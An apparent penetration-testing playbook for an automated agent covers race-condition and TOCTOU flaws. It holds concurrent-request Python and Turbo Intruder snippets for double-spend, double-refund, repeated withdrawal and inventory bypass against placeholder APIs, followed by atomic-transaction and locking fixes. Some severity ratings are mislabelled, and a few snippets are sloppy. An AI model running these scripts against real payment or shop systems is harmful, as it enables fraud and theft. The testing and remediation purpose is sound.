# Agent-0022: Race Condition & TOCTOU Exploitation

## 🎯 Objectives

Test for race conditions (Time-of-Check-Time-of-Use vulnerabilities) in critical operations:
- Transaction race conditions
- Concurrent state manipulation
- Business logic race windows
- Double-spend/double-refund attacks
- Account balance manipulation
- Inventory bypass

## 📋 Scope & Dependencies

**Depends On**:
- Agent-001 (Reconnaissance)
- Agent-003A (REST API)
- Agent-003L (Business Logic)

**Tools Required**:
- Turbo Intruder (Burp Suite extension)
- `multiburst` (Race condition testing)
- Custom Python scripts
- `threading` library
- `concurrent.futures`

## 🔍 Testing Techniques

### 1. Basic Race Condition Detection

```python
import concurrent.futures
import requests

def place_order(amount):
    """Simulate order placement"""
    response = requests.post(
        'https://target.api/orders',
        json={'amount': amount},
        headers={'Authorization': 'Bearer TOKEN'}
    )
    return response.status_code

# Send 100 concurrent requests with same amount
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(place_order, 100) for _ in range(100)]
    results = [f.result() for f in futures]

# If all succeed: Possible race condition
print(f"Successful: {sum(1 for r in results if r == 201)}")
```

### 2. TOCTOU (Time-of-Check-Time-of-Use)

```python
import time
import requests

def check_balance():
    """Check account balance"""
    resp = requests.get(
        'https://target.api/account/balance',
        headers={'Authorization': 'Bearer TOKEN'}
    )
    return resp.json()['balance']

def withdraw(amount):
    """Withdraw funds"""
    balance = check_balance()
    
    if balance >= amount:  # Check
        time.sleep(0.001)  # Tiny delay
        # Between check and use, attacker exploits race condition
        requests.post(
            'https://target.api/account/withdraw',
            json={'amount': amount}  # Use
        )
        return True
    return False

# Race: Thread 1 checks, Thread 2 also checks (before Thread 1 uses)
# Both see sufficient balance and withdraw
```

### 3. Double-Spend Attacks

```python
import threading
import requests

def spend_currency():
    """Spend virtual currency"""
    requests.post(
        'https://target.game.api/spend',
        json={'gems': 1000},
        headers={'Authorization': 'Bearer TOKEN'}
    )

# Thread 1 and Thread 2 both spend same gems simultaneously
t1 = threading.Thread(target=spend_currency)
t2 = threading.Thread(target=spend_currency)

t1.start()
t2.start()
t1.join()
t2.join()

# Check final balance
# If gems deducted only once: Race condition found
```

### 4. Double-Refund Attack

```bash
# Request refund twice simultaneously (using Turbo Intruder)
POST /refund HTTP/1.1
Content-Type: application/json

{"order_id": "12345"}

# Send first request
# Immediately send second request (before server processes first)
# Result: User gets refunded twice
```

### 5. Inventory Bypass

```python
import concurrent.futures
import requests

def purchase_item():
    """Purchase limited item"""
    response = requests.post(
        'https://target.shop.api/purchase',
        json={'product_id': 'rare_item', 'quantity': 1},
        headers={'Authorization': 'Bearer TOKEN'}
    )
    return response.status_code

# 100 users try to buy 1 item (only 10 in stock)
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(purchase_item) for _ in range(100)]
    successful = sum(1 for f in futures if f.result() == 200)

# If successful > 10: Race condition bypasses inventory
print(f"Purchases succeeded: {successful}")
```

## 📊 Expected Findings

### Critical Findings
1. **Race Condition in Transaction Processing**
   - CVSS: 8.8 (Critical)
   - Double-charge/double-refund possible
   - Multiple withdrawals from single check

2. **Inventory Bypass via Race Condition**
   - CVSS: 8.5 (Critical)
   - Stock limits can be exceeded
   - Overselling possible

### High Findings
3. **Account Balance Manipulation**
   - CVSS: 8.2 (High)
   - Balance can be overstated during race window

4. **Payment Processing Race**
   - CVSS: 7.8 (High)
   - Payment captured twice

## 🛡️ Remediation Code Examples

### Vulnerable Code (Node.js)
```javascript
// BAD: Check and use not atomic
app.post('/withdraw', async (req, res) => {
    const userId = req.user.id;
    const amount = req.body.amount;
    
    // Check
    const account = await Account.findById(userId);
    if (account.balance >= amount) {
        // ❌ Race window: Another request could withdraw between check and use
        
        // Use
        account.balance -= amount;
        await account.save();
        res.json({ success: true });
    } else {
        res.status(400).json({ error: 'Insufficient funds' });
    }
});
```

### Fixed Code (Transaction)
```javascript
// GOOD: Atomic transaction
app.post('/withdraw', async (req, res) => {
    const userId = req.user.id;
    const amount = req.body.amount;
    
    const session = await mongoose.startSession();
    session.startTransaction();
    
    try {
        // Check and Use atomically
        const account = await Account.findByIdAndUpdate(
            userId,
            { $inc: { balance: -amount } },
            { 
                new: true,
                session,
                runValidators: true  // Prevents going negative
            }
        );
        
        if (!account || account.balance < 0) {
            await session.abortTransaction();
            return res.status(400).json({ error: 'Insufficient funds' });
        }
        
        await session.commitTransaction();
        res.json({ success: true, balance: account.balance });
    } catch (error) {
        await session.abortTransaction();
        res.status(500).json({ error: 'Transaction failed' });
    } finally {
        session.endSession();
    }
});
```

### Java/Spring Example
```java
// GOOD: Pessimistic locking prevents race conditions
@Service
public class AccountService {
    
    @Transactional
    public void withdraw(Long userId, BigDecimal amount) {
        // ✅ Locks row until transaction complete
        Account account = accountRepository.findByIdWithLock(userId);
        
        if (account.getBalance().compareTo(amount) < 0) {
            throw new InsufficientFundsException();
        }
        
        account.setBalance(account.getBalance().subtract(amount));
        accountRepository.save(account);
    }
}

// Repository with pessimistic locking
@Repository
public interface AccountRepository extends JpaRepository<Account, Long> {
    @Query("SELECT a FROM Account a WHERE a.id = :id")
    @Lock(LockModeType.PESSIMISTIC_WRITE)
    Optional<Account> findByIdWithLock(@Param("id") Long id);
}
```

### SQL-based Fix
```sql
-- GOOD: Optimistic locking with version
CREATE TABLE accounts (
    id BIGINT PRIMARY KEY,
    balance DECIMAL(19, 2),
    version INT NOT NULL DEFAULT 0  -- Version for optimistic locking
);

-- Update with version check
UPDATE accounts 
SET balance = balance - ?,
    version = version + 1
WHERE id = ? AND version = ?;

-- If no rows updated: Version mismatch, retry
```

## ✅ Success Criteria

- [ ] Race condition identified in critical operations
- [ ] Concurrent execution confirmed vulnerable
- [ ] TOCTOU window measured (in milliseconds)
- [ ] Successful exploit demonstrated
- [ ] Financial/business impact quantified
- [ ] Atomic transaction fix provided
- [ ] Locking strategy documented
- [ ] CVSS scoring justified

## 🔗 Related CVEs & References

- CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization
- CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition
- CVE-2021-21224: Chrome TOCTOU
- OWASP: Race Conditions

## 🛠️ Advanced Techniques

### Measuring Race Window
```python
import time
import requests

start = time.time()
response = requests.post('https://target.api/check', json={})
end = time.time()

# If check completes in <100ms, tight race window
# If >500ms, easier to exploit
print(f"Response time: {(end-start)*1000:.2f}ms")
```

### Multi-Stage Race Exploitation
```python
# Stage 1: Trigger condition
requests.post('https://target.api/prepare', json={})

# Stage 2: Quick request 1
t1 = threading.Thread(target=requests.post, 
    args=('https://target.api/process', {'action': 'use'}))

# Stage 3: Quick request 2 (before first completes)
t2 = threading.Thread(target=requests.post,
    args=('https://target.api/process', {'action': 'use'}))

t1.start()
time.sleep(0.001)  # Tiny delay for optimal race
t2.start()
```
